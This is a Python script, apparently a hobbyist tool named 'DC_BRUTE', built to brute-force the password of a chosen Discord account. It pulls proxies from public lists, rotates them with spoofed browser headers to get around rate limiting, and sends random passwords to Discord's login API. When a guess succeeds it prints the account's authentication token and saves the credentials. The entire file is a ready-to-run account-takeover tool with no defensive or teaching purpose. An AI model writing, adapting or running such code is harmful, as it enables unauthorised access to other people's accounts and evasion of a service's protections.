import requests
import random
import string
import threading
import os
import time
import json
from colorama import Fore, init, Back

# Initialize colorama
init()

# Colored ASCII Art
ASCII_ART = f"""
{Fore.BLACK}██████╗ {Fore.LIGHTMAGENTA_EX} ██████╗        {Fore.BLACK}██████╗ {Fore.LIGHTMAGENTA_EX}██████╗ {Fore.BLACK}██╗   ██╗{Fore.LIGHTMAGENTA_EX}████████╗{Fore.BLACK}███████╗
{Fore.BLACK}██╔══██╗{Fore.LIGHTMAGENTA_EX}██╔════╝        {Fore.BLACK}██╔══██╗{Fore.LIGHTMAGENTA_EX}██╔══██╗{Fore.BLACK}██║   ██║{Fore.LIGHTMAGENTA_EX}╚══██╔══╝{Fore.BLACK}██╔════╝
{Fore.BLACK}██║  ██║{Fore.LIGHTMAGENTA_EX}██║             {Fore.BLACK}██████╔╝{Fore.LIGHTMAGENTA_EX}██████╔╝{Fore.BLACK}██║   ██║   {Fore.LIGHTMAGENTA_EX}██║   {Fore.BLACK}████╗  
{Fore.BLACK}██║  ██║{Fore.LIGHTMAGENTA_EX}██║             {Fore.BLACK}██╔══██╗{Fore.LIGHTMAGENTA_EX}██╔══██╗{Fore.BLACK}██║   ██║   {Fore.LIGHTMAGENTA_EX}██║   {Fore.BLACK}██╔══╝  
{Fore.BLACK}██████╔╝{Fore.LIGHTMAGENTA_EX}╚██████╗{Fore.BLACK}███████╗{Fore.BLACK}██████╔╝{Fore.LIGHTMAGENTA_EX}██║  ██║{Fore.BLACK}╚██████╔╝   {Fore.LIGHTMAGENTA_EX}██║   {Fore.BLACK}███████╗
{Fore.BLACK}╚═════╝ {Fore.LIGHTMAGENTA_EX} ╚═════╝{Fore.BLACK}╚══════╝{Fore.BLACK}╚═════╝ {Fore.LIGHTMAGENTA_EX}╚═╝  ╚═╝ {Fore.BLACK}╚═════╝    {Fore.LIGHTMAGENTA_EX}╚═╝   {Fore.BLACK}╚══════╝{Fore.RESET}
                                                                          
1. Start BruteForcing
2. Exit
"""

# Configuration
USERNAME = "target_username"  # Change this to target Discord username
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/master/proxies.txt"
]
PASSWORD_FILE = "valid_discord_pws.txt"
PROXY_FILE = "discord_proxies.txt"
THREADS = 5  # Reduced for Discord's stricter rate limits
MAX_PASSWORD_LENGTH = 16
MIN_PASSWORD_LENGTH = 8
REQUEST_TIMEOUT = 15
DISCORD_API = "https://discord.com/api/v9/auth/login"

# Global variables
proxies = []
found = False
attempts = 0
start_time = time.time()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_password():
    length = random.randint(MIN_PASSWORD_LENGTH, MAX_PASSWORD_LENGTH)
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))

def fetch_proxies():
    global proxies
    proxies = []
    print(f"{Fore.LIGHTMAGENTA_EX}[!] Fetching proxies...{Fore.RESET}")
    
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                new_proxies = response.text.splitlines()
                proxies.extend([p.strip() for p in new_proxies if p.strip()])
                print(f"{Fore.LIGHTMAGENTA_EX}[+] Fetched {len(new_proxies)} proxies from {source}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error fetching from {source}: {e}{Fore.RESET}")
    
    proxies = list(set(proxies))
    print(f"{Fore.LIGHTMAGENTA_EX}[+] Total proxies available: {len(proxies)}{Fore.RESET}")
    
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(proxies))

def get_random_proxy():
    if not proxies:
        fetch_proxies()
    return random.choice(proxies) if proxies else None

def check_password(password):
    global found, attempts
    
    if found:
        return
    
    attempts += 1
    proxy = get_random_proxy()
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None
    
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login"
        }
        
        login_data = {
            "login": USERNAME,
            "password": password,
            "undelete": False,
            "captcha_key": None,
            "login_source": None,
            "gift_code_sku_id": None
        }
        
        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)
        
        response = session.post(
            DISCORD_API,
            headers=headers,
            json=login_data,
            timeout=REQUEST_TIMEOUT
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("token"):
                found = True
                with open(PASSWORD_FILE, 'a') as f:
                    f.write(f"{USERNAME}:{password}\n")
                print(f"\n{Back.BLACK}{Fore.LIGHTMAGENTA_EX}[+] SUCCESS! Valid password found: {password}{Fore.RESET}{Back.RESET}")
                print(f"{Fore.LIGHTMAGENTA_EX}[+] Authentication Token: {data['token']}{Fore.RESET}")
                print(f"{Fore.LIGHTMAGENTA_EX}[+] Password saved to {PASSWORD_FILE}{Fore.RESET}")
                return True
        elif response.status_code == 429:
            retry_after = int(response.headers.get('retry-after', 5))
            print(f"{Fore.RED}[-] Rate limited. Waiting {retry_after} seconds...{Fore.RESET}")
            time.sleep(retry_after)
    
    except Exception as e:
        pass
    
    if attempts % 10 == 0:
        elapsed = time.time() - start_time
        rate = attempts / elapsed if elapsed > 0 else 0
        print(f"{Fore.BLACK}[*] Attempts: {attempts} | Elapsed: {elapsed:.2f}s | Rate: {rate:.2f} attempts/s{Fore.RESET}", end='\r')
    
    return False

def brute_force():
    global found
    
    print(f"{Fore.LIGHTMAGENTA_EX}[!] Starting brute force attack on Discord account: {USERNAME}{Fore.RESET}")
    print(f"{Fore.LIGHTMAGENTA_EX}[!] Using {THREADS} threads with {len(proxies)} proxies{Fore.RESET}")
    
    if not os.path.exists(PASSWORD_FILE):
        with open(PASSWORD_FILE, 'w') as f:
            pass
    
    while not found:
        threads = []
        for _ in range(THREADS):
            if found:
                break
            password = generate_password()
            t = threading.Thread(target=check_password, args=(password,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()

def main():
    clear_screen()
    print(ASCII_ART)
    
    if not os.path.exists(PROXY_FILE):
        fetch_proxies()
    else:
        with open(PROXY_FILE, 'r') as f:
            global proxies
            proxies = [line.strip() for line in f.readlines() if line.strip()]
    
    while True:
        input_prompt = (
            f"{Fore.BLACK}DC{Fore.LIGHTMAGENTA_EX}_BRUTE{Fore.RESET}"
            f"@Input >> {Fore.RESET}"
        )
        choice = input(input_prompt)
        
        if choice == "1":
            brute_force()
            break
        elif choice == "2":
            print(f"{Fore.LIGHTMAGENTA_EX}[!] Exiting...{Fore.RESET}")
            exit()
        else:
            print(f"{Fore.RED}[-] Invalid choice. Please enter 1 or 2.{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Process interrupted by user.{Fore.RESET}")
        exit()
